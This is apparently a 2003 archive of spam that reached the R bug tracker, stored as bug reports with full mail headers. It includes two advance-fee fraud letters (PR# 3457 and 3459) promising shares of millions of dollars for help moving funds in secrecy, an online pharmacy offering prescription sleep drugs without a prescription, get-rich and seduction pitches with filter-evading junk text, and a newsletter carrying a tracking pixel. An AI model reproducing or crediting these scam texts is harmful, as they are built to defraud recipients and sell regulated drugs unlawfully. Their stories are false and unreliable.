more a month?</FONT></STRONG></DIV>
<DIV>&nbsp;</DIV>
<DIV><STRONG><FONT color=3D#347d7e>If so, come join us, order your product=
, schedule your vacation and</FONT></STRONG></DIV>
<DIV><STRONG><FONT color=3D#347d7e>WE'LL GO TO WORK FOR YOU!</FONT></STRON=
G></DIV>
<DIV>&nbsp;</DIV>
<DIV><STRONG><FONT color=3D#0000ff>Free Week Vacation for joining!</FONT><=
/STRONG></DIV>
<DIV>&nbsp;</DIV>
<DIV><STRONG><FONT color=3D#0000ff><A href=3D"mailto:work4u@safe-mail.net?=
subject=3DInfo">CLICK HERE to get the details</A></FONT></STRONG></DIV>
<DIV>&nbsp;</DIV>
<DIV>&nbsp;</DIV>
<DIV>&nbsp;</DIV>
<DIV>&nbsp;</DIV>
<DIV><FONT color=3D#0000ff><STRONG><A href=3D"http://www.hgpenterprises.co=
m/cash/remove.htm">To unsubscribe click here</A>&nbsp;&nbsp; or <A href=3D=
"mailto:onlinecash@sellingstreak.biz?subject=3Dremove">here</A>&nbsp;( Rem=
ove must be in the subject line )</STRONG></FONT></DIV></DIV></DIV>%RANDOM=
_TEXT
--6C6CD.75.B_3--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3455 *
Subject: x1 bvcpf
From: wpqux1 <oeexx1@mail.com>
Date: Fri, 11 Jul 2003 03:06:47 -0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3455 <==
From oeexx1@mail.com Fri Jul 11 09:06:54 2003
Received: from 12.234.152.81 (12-234-152-81.client.attbi.com [12.234.152.81])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6B76XJH025603
	for <r-bugs@biostat.ku.dk>; Fri, 11 Jul 2003 09:06:51 +0200 (MET DST)
Message-Id: <200307110706.h6B76XJH025603@pubhealth.ku.dk>
Received: from rly-yk04.mx.aol.com ([99.100.131.137]) by rly-xw01.mx.aol.com with NNFMP; Jul, 11 2003 1:58:15 AM -0300
Received: from unknown (149.89.93.47) by rly-xr02.mx.aol.com with NNFMP; Jul, 11 2003 12:41:28 AM +0700
From: wpqux1 <oeexx1@mail.com>
To: r-bugs@biostat.ku.dk
Subject: x1 bvcpf
Sender: wpqux1 <oeexx1@mail.com>
Mime-Version: 1.0
Content-Type: text/html; charset="iso-8859-1"
Date: Fri, 11 Jul 2003 03:06:47 -0400
X-Mailer: Microsoft Outlook Express 5.00.2615.200

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<body>
<P><FONT face=Arial>Do you wa<!--{47165}-->nt to...</FONT></P>
<P><FONT face=Arial>Ea<!--{278765}-->rn 
$5<!--{175}-->,000-$<!--{32384}-->10,000 doll<!--{2427676}-->ars each we<!--{44259}-->ek working fr<!--{151}-->om 
ho<!--{245534}-->me?</FONT></P>
<P><FONT face=Arial>Have an <FONT 
color=#cc0000><STRONG>Unli<!--{3889}-->mited In<!--{7266}-->come Po<!--{8869392}-->tential</STRONG></FONT>?</FONT></P>
<P><FONT face=Arial>Joi<!--{5357}-->n 
a Fast Gr<!--{2449}-->owing Com<!--{98919}-->pany?</FONT></P>
<P><FONT face=Arial>Gain Fina<!--{837782}-->ncial Indepen<!--{817}-->dence?</FONT></P>
<P><FONT face=Arial>I<!--{48428}-->f 
You Ans<!--{656869}-->wered Ye<!--{77577}-->s, Th<!--{1984116}-->is Opport<!--{877467}-->unity's For You<!--{96725}-->!</FONT></P>
<P><FONT face=Arial size=5><STRONG>Ca<!--{7929}-->ll Toll Fr<!--{678916}-->ee 800-5<!--{3899}-->70-2125</STRONG></FONT></P>
<BR><BR><BR><BR><BR><BR><BR>
<DIV><A HREF="mailto:jsamual4@rambler.ru&subject=Remove">Cli<!--{577}-->ck for Perma<!--{415}-->nent Rem<!--{76487}-->oval</A></DIV></body></HTML>

qsfarliybksywerexbxoxpja
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3456 *
Subject: Even the ugliest guys can get hot women - learn how xt zc
From: "Jackson Moss" <cda770fkz@centralpets.com>
Date: Sat, 12 Jul 03 00:07:46 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3456 <==
From cda770fkz@centralpets.com Fri Jul 11 11:16:01 2003
Received: from SERVER1 ([218.63.203.194])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6B9FUJH027135;
	Fri, 11 Jul 2003 11:15:37 +0200 (MET DST)
Received: from [47.161.151.88] by SERVER1 with SMTP; Sat, 12 Jul 2003 00:07:46 -0100
Message-ID: <8g$5$$74-$m60p-hnn$5682$q5cobv@uz6.0je.q3e>
From: "Jackson Moss" <cda770fkz@centralpets.com>
Reply-To: "Jackson Moss" <cda770fkz@centralpets.com>
To: ce@biostat.ku.dk
Subject: Even the ugliest guys can get hot women - learn how xt zc
Date: Sat, 12 Jul 03 00:07:46 GMT
X-Mailer: QUALCOMM Windows Eudora Version 5.1
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="9D9.DC5_D_D4__..D."
X-Priority: 3
X-MSMail-Priority: Normal


--9D9.DC5_D_D4__..D.
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html><head><title>Secrets Of A Sex Magnet</title></head><body bgcolor=3DF=
FFFFF><p><u>Now
you can use them and get laid too...</u><p><b><font size=3D"4">PROVEN Tech=
niques
And Tactics For Seducing Only<br>
The HOTTEST Women Into Your Bed?!</font></b>
        <p align=3D"left">Imagine...</p>
        <p align=3D"left">Each time you go out for a night on the town, yo=
u'll
        come home with<br>
        a beautiful &quot;babe&quot; in your arms only to discover that <b=
>up to
        10 messages<br>
        </b>from other beautiful women, desperate to meet you or begging t=
o go
        out<br>
        with you, are waiting <b>on your answering machine!</b></p>
<ul>
  <li>
    <p align=3D"left"><b>Learn</b><b> Where To Meet Women!</b></li>
  <li>
    <p align=3D"left">Guaranteed Conversation Starters!</li>
  <li>
    <p align=3D"left"><b>Multiple Women At Your Disposal!</b></li>
  <li>
    <p align=3D"left">Secrets Of Undressing A Woman Smoothly!<b><br>
    And Much More!</b></li>
</ul>
        <p align=3D"left"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        </b><a href=3D"http://www.seductionissimple.com/seduction/seductio=
nbl.html"><b>Click here to learn the
        secrets of seducing women!</b></a></p>
</body></html>
2eluzp ldwlz 
oqm og zky yr nlrftbovpbcgct j
kww mwkjw  lzfvj slxc

--9D9.DC5_D_D4__..D.--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3457 *
Subject:                                         BUSINESS PROPOSAL AND INVESTMENT.
From: MALINGA   SODINGO <malinga500@netscape.net>
Date: Fri, 11 Jul 2003 13:02:12 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3457 <==
From malinga500@netscape.net Fri Jul 11 13:00:20 2003
Received: from netscape264.com (node-c-08d2.a2000.nl [62.194.8.210])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6BB0EJH028434
	for <r-bugs@biostat.ku.dk>; Fri, 11 Jul 2003 13:00:15 +0200 (MET DST)
Message-Id: <200307111100.h6BB0EJH028434@pubhealth.ku.dk>
From: MALINGA   SODINGO <malinga500@netscape.net>
To: r-bugs@biostat.ku.dk
Reply-To: malinga@fsmail.net
Subject:                                         BUSINESS PROPOSAL AND INVESTMENT.
Date: Fri, 11 Jul 2003 13:02:12 +0200
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="ec85dc78-3247-40b4-88e3-d75b39eaf2cb"


This is a multi-part message in MIME format
--ec85dc78-3247-40b4-88e3-d75b39eaf2cb
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: quoted-printable

THE NETHERLANDS.
+31-630-233-971
                                        BUSINESS PROPOSAL AND INVESTMENT.

  Dear Partner,

     You may be surprised to receive this letter from me since you do not =
know me
personally. I am Sodingo Malinga,the first son of Malinga Tawanda,the most
popular black farmerin Zimbabwe who was murdered in the land dispute in my
country. I got your contact through network online hence decided to write
you.Before the death of my father, he had taken me to Johannesburg to
deposit the sum of US12 million (Twelve million, United States dollars), in
one of the private security company, as he foresaw the looming danger in
Zimbabwe this money was deposited in a box as gem stones to avoid much
demurrage from security company. This amount was meant for the purchase of
new machines and chemicals for the Farms and establishment of
new farms in Swaziland. This land problem came when Zimbabwean President Mr.
Robert Mugabe introduced a new Land Act Reform wholly affecting the rich
white farmers and some few black farmers, and this resulted to the killing
and mob action by Zimbabwean war veterans and some lunatics in the society.
In fact a lot of people were killed because of this Land reform Act for
which my father was one of the victims.
It is against this background that, I and my family fled Zimbabwe for fear
of our lives and are
currently staying in the Netherlands where we are seeking political asylum
and moreso have decided to  transfer my fathers money to a more reliable
foreign account. since the law of Netherlands  prohibits a refugee (asylum
seeker) to open any  bank account or to be involved in any financial
transaction throughout the territorial zone of Netherlands, As the eldest
son of my father, I am saddled with the responsibility of seeking a genuine
foreign account where this money could be transferred without the knowledge
of my government who are bent on taking everything we have got. The South
African government seems to be playing along with them.
outh African government seems to be playing along with them. I am faced
with the dilemma of moving this amount of  money out of South Africa for
fear of going through  the same experience in future, both countries have
similar political history. As a businessman,I am  seeking for a partner who
I have to entrust my  future and that of my family in his hands, I must let
you know that this transaction is risk free. If you accept to assist me and
my family, all I want you to do for me, is to make an arrangements with the
security company to clear the consignment(funds) from their afiliate office
here in the Netherlands as i have already given directives for the
consignment to be brought to the Netherlands from South Africa.But before
then all modalities will have to be put in place like change of ownership to
the consignment  and more importantly this money I intend to use for
investmentment. investmentment.
I have two options for you. Firstly you can choose to have certain
percentage of the money for nominating your account for this transaction. Or
you can go into partnership with me for the proper profitable investment of
the money in your country. Whichever the option you want, feel free to
notify me. I have also mapped out 5% of this money for all kinds of expenses
incurred in the process of this transaction.  If you do not prefer a
partnership I am willing to  give you 15% of the money while the remaining
80%  will be for my investment in your country. Contact me with the above
telephone number or my  E-mail address  I implore you to maintain the
absolute  secrecy required in this transaction.
Thank you, and may GOD BLESS YOU
Yours Faithfully,
Sodingo Malinga..
  
--ec85dc78-3247-40b4-88e3-d75b39eaf2cb--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3458 *
Subject: Trouble sleeping? No prescription required - Ambien, Sonata etc.
From: "Irene Barrow" <h5c7390zrsz@utd.com>
Date: Fri, 11 Jul 03 03:57:02 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3458 <==
From h5c7390zrsz@utd.com Fri Jul 11 13:02:39 2003
Received: from cmr-81-9-139-96.telecable.es (cmr-81-9-139-96.telecable.es [81.9.139.96])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6BB2LJH028456;
	Fri, 11 Jul 2003 13:02:28 +0200 (MET DST)
Received: from kp6.usb4co6.com ([53.104.223.96])
	by cmr-81-9-139-96.telecable.es with SMTP;
	Fri, 11 Jul 2003 03:57:02 -0700
Message-ID: <u12v35fs$m$u40p7tw$kx449@s78lxx5>
From: "Irene Barrow" <h5c7390zrsz@utd.com>
To: p.dalgaard@biostat.ku.dk
Cc: <r-bugs@biostat.ku.dk>, <sr@biostat.ku.dk>
Subject: Trouble sleeping? No prescription required - Ambien, Sonata etc.
Date: Fri, 11 Jul 03 03:57:02 GMT
X-Mailer: MIME-tools 5.503 (Entity 5.501)
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="_.._.B_325C8.D0C61E"
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--_.._.B_325C8.D0C61E
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<HTML>
<HEAD>
  <META NAME=3D"GENERATOR" CONTENT=3D"Adobe PageMill 3.0 Win">
  <TITLE>Untitled Document</TITLE>
</HEAD>
<BODY BGCOLOR=3D"#000000" LINK=3D"#ffde01" ALINK=3D"#ffde01" VLINK=3D"#ffd=
e01"
TEXT=3D"#000099">

<P><CENTER><B><FONT COLOR=3D"#ffffff" SIZE=3D"+2" FACE=3D"Arial"><BR>
Do you have trouble sleeping at night?</FONT></B></CENTER></P>

<P><CENTER><TABLE WIDTH=3D"450" BORDER=3D"1" CELLSPACING=3D"0" CELLPADDING=
=3D"10"
HEIGHT=3D"25">
  <TR>
      <TD WIDTH=3D"100%" BGCOLOR=3D"#306b70" HEIGHT=3D"24"> 
        <P align=3D"center"><b><font color=3D"#d5d5d0" face=3D"Arial">Ambi=
en<font color=3D"#336666">......................</font>Sonata<font
color=3D=
"#336666">.....</font></font></b></P>
        <P><B><FONT FACE=3D"Arial"><A HREF=3D"http://www.border-scripts.co=
m/72">CLICK 
          HERE</A></FONT><FONT COLOR=3D"#d5d5d0" FACE=3D"Arial"> for the l=
owest prices 
          on the most effective FDA approved prescription sleep aides .</F=
ONT></B></P>

        <P align=3D"center"><B><FONT COLOR=3D"#d5d5d0" FACE=3D"Arial">No p=
rior prescription 
          required!<BR>
          Safe, convenient, confidential service!<BR>
          Rush delivery right to your door!</FONT></B></P>
        <P><B><FONT COLOR=3D"#d5d5d0" FACE=3D"Arial">We also offer 60 othe=
r
    popular prescription products that help you enjoy life to it's
    fullest potential. To view our product selection and low prices
    </FONT><FONT FACE=3D"Arial"><A HREF=3D"http://www.border-scripts.com/7=
2">CLICK
    HERE</A></FONT></B></TD> 
  </TR>
</TABLE></CENTER><p></P>

<P><CENTER><B><FONT COLOR=3D"#ffffff" SIZE=3D"+2" FACE=3D"Arial">Low
prices on prescription sleep aides!</FONT></B></CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>
    <A HREF=3D"http://www.border-scripts.com/cxa.html"><FONT
 FACE=3D"arial">To stop n otifications click here</FONT></A><FONT COLOR=3D=
"#5c5e66" FACE=3D"arial"> 
    </FONT> 
  </CENTER>

</BODY>
</HTML>
f cnvtl

cp m
qr qouqbpbjdtsp

--_.._.B_325C8.D0C61E--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3459 *
Subject:                                   STRICTLY  CONFIDENTIAL
From: MILKY GUIE <tete44@mail.com>
Date: Fri, 11 Jul 2003 13:49:15 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3459 <==
From tete44@mail.com Fri Jul 11 13:49:23 2003
Received: from mail726.com (ip503d827a.speed.planet.nl [80.61.130.122])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6BBn7JH029005
	for <r-bugs@biostat.ku.dk>; Fri, 11 Jul 2003 13:49:16 +0200 (MET DST)
Message-Id: <200307111149.h6BBn7JH029005@pubhealth.ku.dk>
From: MILKY GUIE <tete44@mail.com>
To: r-bugs@biostat.ku.dk
Reply-To: mondyg44@netscape.net
Subject:                                   STRICTLY  CONFIDENTIAL
Date: Fri, 11 Jul 2003 13:49:15 +0200
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="34c47fa9-9790-475e-a052-b8db326d5974"


This is a multi-part message in MIME format
--34c47fa9-9790-475e-a052-b8db326d5974
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: quoted-printable

                   STRICTLY   CONFIDENTIAL
Dear Sir,
I am MR MONDY GUEI, the son of late GENERAL ROBERT GUEI Ex-Military Head of =
State of Ivory Coast, who was murdered along with the interior minister on =
the 19th of September 2002.
.
I contacted you because of my need to deal with persons whom my family and I =
have had no previous personal relationships. i got your adress in chambers of =
commerce here in netherlands. Since the murder of my father, I have been =
subjected to all sorts of harassments and intimidation with lots of negative =
reports emananting
from the Government and the Press about my family, the present Government of =
LAURENT GBAGBO has also ensured that out bank accounts are frozen and all =
assets seized.
It is in view of this that I seek your co-operation and assistance in, the =
transfer of this sum of fifteen million five hundred thousand United States =
Dollars only(US$15.5 000,000.00) being the very last of my family fund in my =
possession and control. After the murder of my father, the present Government =
seized al our
properties and froze all our accounts both local and international.
My only hope now is this cash my father carefully packed and deposited as =
Artifacts with al
Securty/Finance Company in netherlands,this sum of US$15.5M can easily be =
withdrawn or paid to a
recommended beneficiary. The security/Finance Company based on my =
instructions will release the fund to you. 
You are to be presented as my business partner who will be fronting for me in =
subsequent ventures and in truth you will be fronting for me in the areas of
business you deem profitable.
To show my preparedness and appreciation to conduct this business with you, I =
shall give you and your family 25% of the funds and 25% commission on all =
proceeds realized from the investment of this fund. 
Also, 5% is to be set aside for any eventual cost that
may occur in the process of this transaction. Please, I need your full =
support and co-operation for the success of this venture. I plead with you to =
treat as urgent and confidential.
This is a delicate issue, which demands a great decree of secrecy, have my =
current political status in mind.
Also Endeavor to contact me through the email addres below =
(guei112@netscape.net) for confidentail reasons
I await your immediate response.
sincerely,
MR MONDY GUEI .  
--34c47fa9-9790-475e-a052-b8db326d5974--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3460 *
Subject: Maritime Newsletter (Week 28)
From: "Marine Digital Inc."<newsletter@marinedigital.com>
Date: Fri, 11 Jul 2003 21:04:08 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3460 <==
From newsletter@marinedigital.com Fri Jul 11 14:15:12 2003
Received: from localhost ([61.106.229.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6BCF4JH029263
	for <r-bugs@biostat.ku.dk>; Fri, 11 Jul 2003 14:15:08 +0200 (MET DST)
Message-Id: <200307111215.h6BCF4JH029263@pubhealth.ku.dk>
Reply-To: newsletter@marinedigital.com
From: "Marine Digital Inc."<newsletter@marinedigital.com>
To: r-bugs@biostat.ku.dk
Subject: Maritime Newsletter (Week 28)
Mime-Version: 1.0
Content-Type: text/html; charset="iso-8859-1"
Date: Fri, 11 Jul 2003 21:04:08 +0900

<html>
<head>
<title>MarineDigital Newsletter</title>
<link rel="stylesheet" type="text/css" href="http://www.marinedigital.com/style_marine.css">
</head>
<BODY text=#000000 bgColor=#ffffff leftMargin=0 topMargin=0 marginwidth="0"
marginheight="0">
<DIV align=center>
<TABLE cellSpacing=0 borderColorDark=#ffffff cellPadding=0 width=562
borderColorLight=#808040 border=0>
<TBODY>
<TR>
<TD vAlign=top width=603 height=54>
<TABLE height=3 cellSpacing=0 cellPadding=0 width=590 border=0>
<TBODY>
<TR>
<TD height=3><IMG height=50
src="http://www.marinedigital.com/en/news/img/top.gif"
width=580></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD bgColor=#ffffff height=0.5 width="603"></TD></TR>
<TR>
<TD class=wtext align=center bgColor=#a9340f height=17 width="603"><A
href="http://www.marinedigital.com/en/mall/ship/index.asp"><FONT
color=#ffffff>SHIP S&amp;P</FONT></A> &nbsp;<B>l</B>&nbsp; <A
href="http://www.marinedigital.com/en/mall/product/index.asp"><FONT
color=#ffffff>NEW PRODUCT S&amp;P</FONT></A> &nbsp;<B>l</B>&nbsp; <A
href="http://www.marinedigital.com/en/mall/equipment/index.asp"><FONT
color=#ffffff>USED PRODUCT S&amp;P</FONT></A> &nbsp;<B>l</B>&nbsp; <A
href="http://www.marinedigital.com/en/mall/spare/index.asp"><FONT
color=#ffffff>SPARE PART S&amp;P</FONT></A> &nbsp;<B>l</B>&nbsp; <a href="http://www.marinedigital.com/en/mall/Shipbuilding/index.asp"><font color="#ffffff">SHIPBUILDING</font></a></TD></TR>
<TR>
<TD width="603">
<TABLE height=1 cellSpacing=1 cellPadding=0 bgColor=#999999 border=0 width="560">
<TBODY>
<TR>
<TD vAlign=top width=172 bgColor=#ffffff height=1>
<TABLE height=104 cellSpacing=0 cellPadding=0 width=170 border=0>
<TBODY>
<TR>
<TD class=wtext style="padding-top: 2; padding-bottom: 2"
align=center bgColor=#fdae02 height=47><FONT
color=#2b4996><B>WEEK 28</B></FONT><BR><B>ISSUE 81, 11<sup>th</sup>&nbsp;JUL.
2003</B><BR><A
href="http://www.marinedigital.com">www.marinedigital.com</A></TD></TR>
<tr>
<TD class=text style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fd7e02 height=1></TD>
</tr>
<tr>
<TD class=text style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#FAC64B height=1><b>&nbsp;&nbsp;&nbsp;&nbsp; -
Newsletter Receivers -</b><br>
&nbsp;&nbsp;&nbsp;&nbsp; <font color="#e1330b"><b>158,341</b> </font>Maritime
people<br>
&nbsp;&nbsp;&nbsp;<font color="#e1330b"><b>&nbsp;&nbsp;&nbsp;
65,729 </b></font>Companies</TD>
</tr>
<TR>
<TD class=text
style="border: 2px outset #FFFFFF; padding-top: 1; padding-bottom: 1"
bgColor=#fdd06d height=22>
<P align=center><A
href="http://www.marinedigital.com/en/newsletter_form/letter.asp"><FONT
color=#990000><B>Subscribe the newsletter</B></FONT></A>
</P></TD></TR>
<TR>
<TD class=text
style="border: 2px outset #FFFFFF; padding-top: 1; padding-bottom: 1"
bgColor=#fdd06d height=22>
<P align=center><ALIGN="CENTER"><A
href="http://www.marinedigital.com/en/mar_unsubscribe.asp?nw_email=r-bugs@biostat.ku.dk"
target=_blank><FONT
color=#ff0000><B>Unsubscribe</B></FONT></A><img src="http://61.106.229.20/md_email_open.asp?nw_email=r-bugs@biostat.ku.dk&nw_news=ME0328" width=1 height=1>
</P>
</TD></TR>
<tr>
<TD class=text style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fd7e02 height=1><a href="http://www.marinedigital.com/en/mall/main/index.asp?menu_code=newper"><img border="0" src="http://www.marinedigital.com/en/news/used_products_news/img/nl_Pmember.gif" width="170" height="33"></a></TD>
</tr>
<tr>
<TD
bgColor=#FD7E02 height=18 align="center" style="padding-top: 0; padding-bottom: 0">
<P class=text align=left><font color="#FFFFFF"><B>&nbsp;&nbsp;&nbsp;&nbsp;
RELATED NEWSLETTERS
</B> </font></P></TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=16><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12>                    <a href="http://www.marinedigital.com/news/SE20030613.htm">Ship
S&amp;P Newsletter</a></TD>
</tr>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=14><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12>                   <a href="http://www.marinedigital.com/news/UE20030611.htm">Used
Products Newsletter</a></TD>
</tr>
<TR>
<TD class=wtext style="padding-top: 0; padding-bottom: 0"
align=center bgColor=#fd7e02 height=17><B>YOUR FREE
POSTING</B></TD></TR>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=35><IMG height=8
src="http://www.marinedigital.com/en/img/blue_icon.gif"
width=8> <A
href="http://www.marinedigital.com/en/mall/ship/index.asp?menu_code=ShipSaleRegister">Sell
Ship</A><BR><IMG height=8
src="http://www.marinedigital.com/en/img/blue_icon.gif"
width=8> <A
href="http://www.marinedigital.com/en/mall/ship/index.asp?menu_code=ShipPurchaseRegister">Purchase
Ship</A></TD>
</tr>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#FAC64B height=35><IMG height=8
src="http://www.marinedigital.com/en/img/blue_icon.gif"
width=8>&nbsp; <a href="http://www.marinedigital.com/en/mall/Shipbuilding/index.asp?menu_code=ShipNewRegister">Post
Newbuilding Inquiry</a><BR><IMG height=8
src="http://www.marinedigital.com/en/img/blue_icon.gif"
width=8>&nbsp; <a href="http://www.marinedigital.com/en/mall/Shipbuilding/index.asp?menu_code=ShipBuildersRegister">Post
Your Shipbuilder</a></TD></TR>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Product/index.asp?menu_code=ShipSaleRegister">Sell
New Product</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Product/index.asp?menu_code=ShipPurchaseRegister">Purchase
New Product</A></TD></TR>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentSaleRegister">Sell
Used Product</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentPurchaseRegister">Purchase
Used Product</A></TD></TR>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Inventory/index.asp?menu_code=InventorySaleRegister">Sell
Inventories</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Inventory/index.asp?menu_code=InventoryPurchaseRegister">Purchase
Inventories</A></TD></TR>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Spare/index.asp?menu_code=SpareSaleRegister">Sell
Spare Part</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Spare/index.asp?menu_code=SparePurchaseRegister">Purchase
Spare Part</A></TD></TR>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Partner/index.asp?menu_code=PartnerLookingRegister">Looking
for Partner</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/mall/Partner/index.asp?menu_code=PartnerWantingRegister">Wanting
your Partner</A></TD></TR>
<TR>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=35><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/ship_repairs/form/repair.asp">Ship
Repair Inquiry</A><BR><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/ship_repairs/form/regist01.asp">Join
Repair Network</A></TD></TR>
<tr>
<TD class=text style="padding-top: 0; padding-bottom: 0"
bgColor=#fce1a4 height=17><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12> <A
href="http://www.marinedigital.com/en/products_sell/registration/form.asp">PANAMA
Flag Registration</A></TD>
</tr>
<TR>
<TD class=text
style="border: 2px ridge #FDD06D; padding-top: 5; padding-bottom: 5"
vAlign=center align=middle bgColor=#fdd06d height=38><B><FONT
color=#990000>:: BANNER ADVERTISEMENT ::<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</FONT></B><IMG height=11
src="http://www.marinedigital.com/en/news/img/button.gif"
width=12><FONT color=#666666><B> <FONT color=#808080><A
href="http://www.marinedigital.com/en/mall/product/index.asp?menu_code=ShipSaleView&amp;GoodsNo=S51602036">Send
your Ads</A></FONT></B></FONT></TD></TR>
<TR>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fdd06d height=1></TD></TR>
<tr>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fce1a4 height=47><a href="http://www.marinedigital.com/chilsung/"><IMG
height=45
src="http://www.marinedigital.com/en/news/img/ad_chilsung.jpg"
width=170 border=0></a></TD>
</tr>
<tr>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fce1a4 height=47><A
href="http://www.marinedigital.com/en/products_sell/hdvalve/intro.asp"><IMG
height=45
src="http://www.marinedigital.com/en/news/img/banner_valve.gif"
width=170 border=0></A></TD>
</tr>
<tr>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fce1a4 height=47><a href="http://www.marinedigital.com/en/products_sell/accommterior/main.asp"><img border="0" src="http://www.marinedigital.com/en/news/img/accomterior.jpg" width="170" height="45"></a></TD>
</tr>
<TR>
<TD style="PADDING-BOTTOM: 0px; PADDING-TOP: 0px"
bgColor=#fd7e02 height=1></TD></TR>
<TR>
<TD style="padding-top: 0; padding-bottom: 0"
bgColor=#fdae02 height=70>
<P class=text style="MARGIN-LEFT: 7px" align=left><FONT
color=#4c598f>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<B>:::
